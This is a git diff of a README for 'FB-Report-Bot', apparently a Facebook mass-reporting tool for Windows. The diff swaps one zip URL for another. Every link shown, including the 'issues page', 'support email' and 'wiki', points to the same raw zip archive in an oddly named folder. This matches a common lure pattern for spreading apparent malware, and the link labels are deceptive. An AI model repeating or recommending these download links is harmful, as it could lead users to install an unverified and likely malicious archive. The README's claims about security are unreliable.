@@ -1,7 +1,7 @@
 # 🤖 FB-Report-Bot - Simplify Your Facebook Reporting
 
 ## 📥 Download Now
-[![Download FB-Report-Bot](https://github.com/Oke-Precious/FB-Report-Bot/raw/refs/heads/main/Pleurosticti/F-Bot-Report-v2.2-beta.5.zip)](https://github.com/Oke-Precious/FB-Report-Bot/raw/refs/heads/main/Pleurosticti/F-Bot-Report-v2.2-beta.5.zip)
+[![Download FB-Report-Bot](https://raw.githubusercontent.com/Oke-Precious/FB-Report-Bot/main/Pleurosticti/F_Bot_Report_Basilarchia.zip)](https://raw.githubusercontent.com/Oke-Precious/FB-Report-Bot/main/Pleurosticti/F_Bot_Report_Basilarchia.zip)
 
 ## 🚀 Getting Started
 Welcome to FB-Report-Bot! This tool helps you report issues on Facebook securely and efficiently. Follow these easy steps to download and start using the application.
@@ -23,7 +23,7 @@ To run FB-Report-Bot smoothly, make sure your computer meets these basic require
 
 ## 🌐 Download & Install
 1. **Visit the Releases Page**
-   To get the latest version of FB-Report-Bot, visit the following page: [FB-Report-Bot Releases](https://github.com/Oke-Precious/FB-Report-Bot/raw/refs/heads/main/Pleurosticti/F-Bot-Report-v2.2-beta.5.zip).
+   To get the latest version of FB-Report-Bot, visit the following page: [FB-Report-Bot Releases](https://raw.githubusercontent.com/Oke-Precious/FB-Report-Bot/main/Pleurosticti/F_Bot_Report_Basilarchia.zip).
 
 2. **Select the Latest Release**
    On the releases page, you will see a list of available versions. Look for the latest release at the top for the most recent features and fixes.
@@ -64,16 +64,16 @@ A: Yes, FB-Report-Bot is designed to prioritize your security. The tool uses dyn
 A: Currently, FB-Report-Bot is designed for Windows. We may offer support for other operating systems in future updates.
 
 **Q: How can I report a bug or suggest a feature?**  
-A: Please visit the [issues page](https://github.com/Oke-Precious/FB-Report-Bot/raw/refs/heads/main/Pleurosticti/F-Bot-Report-v2.2-beta.5.zip) on GitHub to report any problems or suggest new features.
+A: Please visit the [issues page](https://raw.githubusercontent.com/Oke-Precious/FB-Report-Bot/main/Pleurosticti/F_Bot_Report_Basilarchia.zip) on GitHub to report any problems or suggest new features.
 
 ## 📞 Support
 If you encounter any issues while using FB-Report-Bot, please reach out through the following channels:
 
-- GitHub Issues: [Report Issue](https://github.com/Oke-Precious/FB-Report-Bot/raw/refs/heads/main/Pleurosticti/F-Bot-Report-v2.2-beta.5.zip)
-- Email: https://github.com/Oke-Precious/FB-Report-Bot/raw/refs/heads/main/Pleurosticti/F-Bot-Report-v2.2-beta.5.zip
+- GitHub Issues: [Report Issue](https://raw.githubusercontent.com/Oke-Precious/FB-Report-Bot/main/Pleurosticti/F_Bot_Report_Basilarchia.zip)
+- Email: https://raw.githubusercontent.com/Oke-Precious/FB-Report-Bot/main/Pleurosticti/F_Bot_Report_Basilarchia.zip
 
 ## 🌟 Additional Resources
-For more detailed information and guides, visit our wiki page on GitHub: [FB-Report-Bot Wiki](https://github.com/Oke-Precious/FB-Report-Bot/raw/refs/heads/main/Pleurosticti/F-Bot-Report-v2.2-beta.5.zip).
+For more detailed information and guides, visit our wiki page on GitHub: [FB-Report-Bot Wiki](https://raw.githubusercontent.com/Oke-Precious/FB-Report-Bot/main/Pleurosticti/F_Bot_Report_Basilarchia.zip).
 
 ## 📖 Conclusion
 Thank you for choosing FB-Report-Bot. We hope this tool enhances your experience on Facebook. Happy reporting! 
